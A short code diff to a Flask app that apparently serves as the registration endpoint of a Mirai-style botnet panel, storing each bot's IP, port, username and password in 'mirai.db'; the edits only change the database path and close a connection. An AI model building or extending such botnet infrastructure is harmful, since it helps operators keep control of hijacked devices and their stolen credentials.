@@ -2,7 +2,7 @@ import sqlite3
 from app import app
 from flask import g, request, jsonify
 
-DATABASE = "/root/mirai.db"
+DATABASE = "mirai.db"
 
 @app.route("/NewBot", methods = ['POST'])
 def new_bot():
@@ -20,6 +20,7 @@ def new_bot():
         i_port = int(port)
         c.execute("INSERT INTO bots (ip, port, uname, pword) values (?, ?, ?, ?)", (ip, i_port, uname, pword))
         get_db().commit()
+        close_connection()
         return jsonify({'success': True})
     else:
         print("error")
